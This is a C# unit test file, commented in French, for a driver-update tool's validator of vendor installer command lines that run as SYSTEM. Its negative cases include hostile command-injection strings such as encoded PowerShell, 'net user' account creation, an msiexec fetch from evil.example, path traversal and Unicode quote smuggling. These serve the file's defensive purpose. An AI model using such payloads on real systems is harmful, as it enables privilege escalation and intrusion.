using SpokaPilote.Core.Infrastructure;
using SpokaPilote.Core.Install;
using SpokaPilote.Core.Models;
using SpokaPilote.Core.Sources;
using SpokaPilote.Core.Sources.Gpu;
using SpokaPilote.Core.Sources.Oem;

namespace SpokaPilote.Core.Tests;

/// <summary>
/// Lignes de commande des installeurs constructeurs, exécutées en SYSTEM : seules les formes attendues (programme du
/// paquet, sans enchaînement, redirection ni variable) passent ; elles sont lancées directement, sans « cmd /c ».
/// </summary>
public sealed class VendorCommandTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "SpokaPilote.Tests", "vendor-" + Guid.NewGuid().ToString("N"));
    private readonly string _downloads;
    private readonly string _package;
    private readonly string _file;

    public VendorCommandTests()
    {
        _downloads = Directory.CreateDirectory(Path.Combine(_root, "downloads")).FullName;
        _package = Directory.CreateDirectory(Path.Combine(_root, "extracted", "lenovo_n32ww12w")).FullName;
        _file = Path.Combine(_downloads, "n32ww12w.exe");
        File.WriteAllBytes(_file, [0x4D, 0x5A]);
        File.WriteAllBytes(Path.Combine(_package, "n32ww12w.exe"), [0x4D, 0x5A]);
        File.WriteAllBytes(Path.Combine(_package, "Setup.exe"), [0x4D, 0x5A]);
        File.WriteAllText(Path.Combine(_package, "install.cmd"), "@echo off");
    }

    public void Dispose()
    {
        try { Directory.Delete(_root, recursive: true); } catch (IOException) { /* fichiers temporaires */ }
    }

    /// <summary>Formes réelles relevées dans les catalogues Lenovo (142 descripteurs), HP (2 références) et les commandes intégrées.</summary>
    [Theory]
    [InlineData("n32ww12w.exe /VERYSILENT /DIR=%PACKAGEPATH% /EXTRACT=\"YES\"")]
    [InlineData("tbt4dkkp2fw1014_3.exe /VERYSILENT /unp /DIR=%PACKAGEPATH% /EXTRACT=\"YES\"")]
    [InlineData(@"%PACKAGEPATH%\n32ww12w.exe /verysilent /DIR=%PACKAGEPATH%\TMP")]
    [InlineData(@"%PACKAGEPATH%\n3xfz15w.exe /SP- /VERYSILENT /NORESTART /SUPPRESSMSGBOXES")]
    [InlineData(@"%PACKAGEPATH%\AVC79C3N1\n32cm06w.exe /forcerestart")]
    [InlineData(@"%PACKAGEPATH%\winuptp.exe -s -f")]
    [InlineData("\"%FILE%\" /s /l=\"%PACKAGEPATH%\\dup.log\"")]                                   // Dell
    [InlineData("\"%FILE%\" /s /e /f \"%PACKAGEPATH%\"")]                                         // HP (extraction)
    [InlineData("\"setup.exe\"  /v\"/qn REBOOT=ReallySuppres\"")]                                 // HP
    [InlineData("\"Setup.exe\" /s /v/qn")]
    [InlineData("\"HpFirmwareUpdRec.exe\" -r -b -s")]
    [InlineData("install.cmd")]
    [InlineData("SP149450 -s")]
    [InlineData(NvidiaSource.ExtractCommand)]
    [InlineData(NvidiaSource.SilentCommand)]
    public void Real_vendor_commands_are_accepted(string command) => Assert.Null(VendorCommand.Validate(command));

    [Theory]
    [InlineData(@"%PACKAGEPATH%\setup.exe -s & powershell -enc SQBFAFgA", "&")]
    [InlineData(@"%PACKAGEPATH%\setup.exe -s && net user x y /add", "&")]
    [InlineData(@"%PACKAGEPATH%\setup.exe -s | cmd", "|")]
    [InlineData(@"%PACKAGEPATH%\setup.exe -s > C:\Windows\win.ini", ">")]
    [InlineData(@"%PACKAGEPATH%\setup.exe -s < x", "<")]
    [InlineData("%PACKAGEPATH%\\setup.exe -s ^& calc", "^")]
    [InlineData("%PACKAGEPATH%\\setup.exe -s\r\ncalc", "retour à la ligne")]
    [InlineData(@"%PACKAGEPATH%\setup.exe %COMSPEC% /c calc", "%")]
    [InlineData(@"%PACKAGEPATH%\setup.exe !x!", "!")]
    [InlineData("\"%PACKAGEPATH%\\setup.exe -s", "guillemets")]
    [InlineData("cmd.exe /c calc", "système")]
    [InlineData("powershell -NoProfile -EncodedCommand SQBFAFgA", "système")]
    [InlineData("msiexec /i https://evil.example/x.msi /qn", "système")]
    [InlineData(@"C:\Windows\System32\cmd.exe /c calc", "paquet")]
    [InlineData(@"\\attaquant\partage\x.exe", "paquet")]
    [InlineData(@"%PACKAGEPATH%\..\..\..\Windows\System32\cmd.exe /c calc", "..")]
    [InlineData(@"%LOGPATH%\x.exe", "paquet")]
    // Programmes que l'installation refuserait toujours : écartés dès l'analyse (pas d'échec à chaque maintenance).
    [InlineData(@"%PACKAGEPATH%\x.ps1", "type de programme non autorisé (.ps1)")]
    [InlineData("\"setup.msi\" /qn", "type de programme non autorisé (.msi)")]
    [InlineData(@"%PACKAGEPATH%\Install.VBS //B", "type de programme non autorisé (.vbs)")]
    [InlineData("driver.inf", "type de programme non autorisé (.inf)")]
    [InlineData("SP12345.zip -s", "type de programme non autorisé (.zip)")]
    // Unicode : converti « au mieux » dans la page de code d'un installeur ANSI, U+FF02 devient « " » (injection d'arguments).
    [InlineData("%PACKAGEPATH%\\setup.exe /s /v\uFF02/qn REBOOT=R\uFF02", "non ASCII")]
    [InlineData("%PACKAGEPATH%\\setup.exe /s \uFF0F\uFF0F x", "non ASCII")]
    [InlineData("%PACKAGEPATH%\\setup.exe /DIR=C:\\Données", "non ASCII")]
    [InlineData("%PACKAGEPATH%\\setup\u2215..\u2215cmd.exe", "non ASCII")]
    [InlineData("%PACKAGEPATH%\\setup.exe \u00A0-s", "non ASCII")]
    public void Injected_or_unexpected_commands_are_refused(string command, string reason)
    {
        var problem = VendorCommand.Validate(command);
        Assert.NotNull(problem);
        Assert.Contains(reason, problem);
        Assert.Throws<SecurityException>(() => VendorCommand.Resolve(command, _file, _package, _package, packageAllowed: true));
    }

    [Theory]
    [InlineData("n32ww12w.exe", null)]
    [InlineData("SP170001.EXE", null)]
    [InlineData("install.cmd", null)]
    [InlineData("pack.msi", ".msi")]
    [InlineData("driver.zip", ".zip")]
    [InlineData("setup", "sans extension")]
    public void Downloaded_installer_must_be_a_launchable_type(string fileName, string? refused)
    {
        // « %FILE% » = l'installeur téléchargé : son type est connu dès l'analyse (nom du fichier dans le catalogue).
        var problem = VendorCommand.Validate("\"%FILE%\" /s", fileName);
        if (refused is null) Assert.Null(problem);
        else Assert.Contains(refused, problem);
        Assert.Null(VendorCommand.Validate("\"%FILE%\" /s")); // nom inconnu : contrôlé à l'exécution
    }

    [Fact]
    public void Scan_and_install_agree_on_the_program_types()
    {
        // Tout ce que l'analyse accepte, l'installation l'accepte (programme présent) : plus de paquet proposé à chaque
        // analyse puis refusé à chaque maintenance (et compté comme échec par le disjoncteur des anneaux).
        foreach (var name in new[] { "a.exe", "b.cmd", "c.bat", "d.ps1", "e.msi", "f.vbs", "g.js", "h.com", "i.scr", "j.hta" })
        {
            File.WriteAllText(Path.Combine(_package, name), "");
            var command = $@"%PACKAGEPATH%\{name}";
            var accepted = VendorCommand.Validate(command) is null;
            var runs = true;
            try { VendorCommand.Resolve(command, _file, _package, _package, packageAllowed: true); }
            catch (SecurityException) { runs = false; }
            Assert.Equal(runs, accepted);
        }
    }

    [Fact]
    public void Commands_run_the_package_program_directly_without_a_shell()
    {
        var silent = VendorCommand.Resolve(@"%PACKAGEPATH%\n32ww12w.exe /verysilent /DIR=%PACKAGEPATH%\TMP", _file, _package, _package, packageAllowed: true);
        Assert.Equal(Path.Combine(_package, "n32ww12w.exe"), silent.FileName);
        Assert.Equal($@"/verysilent /DIR={_package}\TMP", silent.Arguments);

        var extract = VendorCommand.Resolve("n32ww12w.exe /VERYSILENT /DIR=%PACKAGEPATH% /EXTRACT=\"YES\"", _file, _package, _downloads, packageAllowed: false);
        Assert.Equal(_file, extract.FileName);
        Assert.Equal($"/VERYSILENT /DIR={_package} /EXTRACT=\"YES\"", extract.Arguments);

        var dell = VendorCommand.Resolve("\"%FILE%\" /s /l=\"%PACKAGEPATH%\\dup.log\"", _file, _package, _downloads, packageAllowed: true);
        Assert.Equal(_file, dell.FileName);

        var hp = VendorCommand.Resolve("\"Setup\" /s /v/qn", _file, _package, _package, packageAllowed: true); // extension implicite
        Assert.Equal(Path.Combine(_package, "Setup.exe"), hp.FileName);
        Assert.Equal("/s /v/qn", hp.Arguments);
    }

    [Fact]
    public void Package_script_runs_through_cmd_with_the_full_line_checked()
    {
        var script = VendorCommand.Resolve("install.cmd /quiet", _file, _package, _package, packageAllowed: true);
        Assert.Equal(ProcessRunner.SystemTool("cmd.exe"), script.FileName);
        Assert.Equal($"/d /s /c \"\"{Path.Combine(_package, "install.cmd")}\" /quiet\"", script.Arguments);
    }

    [Fact]
    public void Extraction_may_only_run_the_downloaded_installer()
    {
        // Autre fichier du dossier de téléchargements (autre installeur signé déjà en cache) : refusé.
        File.WriteAllBytes(Path.Combine(_downloads, "other.exe"), [0x4D, 0x5A]);
        Assert.Throws<SecurityException>(() => VendorCommand.Resolve("other.exe /S", _file, _package, _downloads, packageAllowed: false));
        // Fichier du paquet pendant l'extraction : refusé (le paquet n'est pas encore extrait par l'installeur vérifié).
        Assert.Throws<SecurityException>(() => VendorCommand.Resolve(@"%PACKAGEPATH%\Setup.exe", _file, _package, _downloads, packageAllowed: false));
        // Programme absent du paquet : échec ordinaire, pas d'exécution.
        Assert.Throws<FileNotFoundException>(() => VendorCommand.Resolve(@"%PACKAGEPATH%\absent.exe -s", _file, _package, _package, packageAllowed: true));
        // Type de fichier non exécutable directement.
        File.WriteAllText(Path.Combine(_package, "x.ps1"), "");
        Assert.Throws<SecurityException>(() => VendorCommand.Resolve(@"%PACKAGEPATH%\x.ps1", _file, _package, _package, packageAllowed: true));
    }

    // ------------------------------------------------------------------ catalogues

    private static ScanContext LenovoContext() => new()
    {
        System = new SystemInfo
        {
            Manufacturer = "LENOVO", Model = "20XWCTO1WW", OsVersion = new Version(10, 0, 26100), OsDisplayVersion = "24H2", Architecture = "amd64",
        },
        Devices = new[]
        {
            new DeviceInfo
            {
                InstanceId = @"PCI\VEN_8086&DEV_15F3&SUBSYS_0A6B1028&REV_03\3&1", Name = "Intel(R) Ethernet Controller I225-V",
                HardwareIds = new[] { @"PCI\VEN_8086&DEV_15F3&SUBSYS_0A6B1028&REV_03", @"PCI\VEN_8086&DEV_15F3" }, DriverVersion = "12.19.1.1",
            },
        },
        Settings = new Settings(),
        Options = new ScanOptions(),
    };

    private static string LenovoDescriptor(string extract, string cmdline) => $"""
        <?xml version="1.0" encoding="utf-8"?>
        <Package name="INTEL_LAN" id="n32ul16w" version="12.19.2.60">
          <Title default="EN"><Desc id="EN">Intel Ethernet Driver - 11</Desc></Title>
          <PackageType type="2" />
          <ExtractCommand>{System.Security.SecurityElement.Escape(extract)}</ExtractCommand>
          <Install rc="0,3010" type="cmd" default="EN"><Cmdline id="EN">{System.Security.SecurityElement.Escape(cmdline)}</Cmdline></Install>
          <DetectInstall><_Driver><HardwareID><![CDATA[PCI\VEN_8086&DEV_15F3]]></HardwareID><Version>12.19.2.60^</Version></_Driver></DetectInstall>
          <Dependencies><_PnPID><![CDATA[PCI\VEN_8086&DEV_15F3*]]></_PnPID></Dependencies>
          <Files><Installer><File><Name>n32ul16w.exe</Name><CRC>C030171D1BB5E65B8F9B9BCD0234BA0D805F2635F6E96A5951B78064347F9A90</CRC></File></Installer></Files>
        </Package>
        """;

    [Fact]
    public void Lenovo_descriptor_with_injected_command_line_is_refused()
    {
        var uri = new Uri("https://download.lenovo.com/pccbbs/mobiles/n32ul16w_2_.xml");
        const string extract = "n32ul16w.exe /VERYSILENT /DIR=%PACKAGEPATH% /EXTRACT=\"YES\"";
        Assert.NotNull(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, @"%PACKAGEPATH%\setup.exe -s"), uri, "Networking", LenovoContext()));

        // Descripteur altéré (console compromise, cache local modifié...) : le paquet est écarté dès l'analyse.
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, @"%PACKAGEPATH%\setup.exe -s & powershell -w hidden -enc SQBFAFgA"),
            uri, "Networking", LenovoContext()));
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor("cmd /c n32ul16w.exe", @"%PACKAGEPATH%\setup.exe -s"), uri, "Networking", LenovoContext()));
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, "C:\\Windows\\System32\\cmd.exe /c calc"), uri, "Networking", LenovoContext()));
        // Programme que l'installation refuserait toujours, ou argument Unicode : écarté dès l'analyse.
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, @"%PACKAGEPATH%\setup.msi /qn"), uri, "Networking", LenovoContext()));
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, @"%PACKAGEPATH%\install.ps1"), uri, "Networking", LenovoContext()));
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor(extract, "%PACKAGEPATH%\\setup.exe /v\uFF02/qn\uFF02"), uri, "Networking", LenovoContext()));
        Assert.Null(LenovoSource.ParseDescriptor(LenovoDescriptor("n32ul16w.zip /x", @"%PACKAGEPATH%\setup.exe -s"), uri, "Networking", LenovoContext()));
    }

    [Fact]
    public void Hp_softpaq_with_unexpected_command_line_is_skipped()
    {
        var fixture = Path.Combine(AppContext.BaseDirectory, "Fixtures", "hp-reference.xml");
        var xml = File.ReadAllText(fixture)
            .Replace("<SilentInstall>\"Setup.exe\" -s</SilentInstall>", "<SilentInstall>\"Setup.exe\" -s &amp;&amp; net user pirate P@ss /add</SilentInstall>");
        Assert.Contains("net user", xml);
        var path = Path.Combine(_root, "hp-injected.xml");
        File.WriteAllText(path, xml);
        var context = new ScanContext
        {
            System = new SystemInfo { Manufacturer = "HP", Model = "x", BaseBoardProduct = "8549", OsVersion = new Version(10, 0, 26100), Architecture = "amd64" },
            Devices = LenovoContext().Devices,
            Settings = new Settings(),
            Options = new ScanOptions(),
        };
        Assert.Contains(HpSource.Parse(fixture, context), c => c.SourceItemId == "sp170001"); // témoin : proposé avec la commande d'origine
        Assert.DoesNotContain(HpSource.Parse(path, context), c => c.SourceItemId == "sp170001");
    }
}
